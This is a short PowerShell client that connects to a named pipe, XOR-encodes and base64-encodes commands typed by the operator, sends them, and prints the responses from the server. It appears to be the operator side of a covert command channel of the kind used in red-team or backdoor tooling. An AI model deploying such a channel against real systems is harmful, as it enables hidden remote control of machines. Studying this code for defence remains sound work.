Param
	(
		[Parameter(Position = 0, Mandatory = $True)] [String] $p,
		[Parameter(Position = 1, Mandatory = $True)] [Byte] $k

	)

$psVersion = $PSVersionTable.PSVersion
if ($psVersion.Major -ge 5) {
	write-host "ok"
	# carry on
} else {
	Write-Host "PowerShell version is less than 5.0. Current version is: $($psVersion.ToString())"
	exit
}

Write-Host "connecting to $p pipe..."
$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(
	".",
	$p,
	[System.IO.Pipes.PipeDirection]::InOut # burger
	#[System.IO.Pipes.PipeOptions]::None
	#[System.Security.Principal.TokenImpersonationLevel]::Impersonation
)

$pipeClient.Connect()
Write-Host "connected to $p pipe..."

$reader = New-Object System.IO.StreamReader($pipeClient)
$writer = New-Object System.IO.StreamWriter($pipeClient)
$writer.AutoFlush = $true

while ($true) {
	$command = Read-Host "Enter command (type 'exit' to quit)"

	$commandBytes = [System.Text.Encoding]::UTF8.GetBytes($command)

	# encrypt command
	$xoredBytes = for ($i = 0; $i -lt $commandBytes.Length; $i++) {
		[byte]($commandBytes[$i] -bxor $k)
	}

	# base64 encode encrypted command
	$encodedCommand = [Convert]::ToBase64String($xoredBytes)

	$writer.WriteLine($encodedCommand)

	if ($command -eq "exit") {
		break
	}
	Write-Host "Server response:"
	while ($true) {
		$response = $reader.ReadLine()
		if ($response -eq "EOF") { break }
		Write-Host $response
	}
}

$reader.Close()
$writer.Close()
$pipeClient.Close()
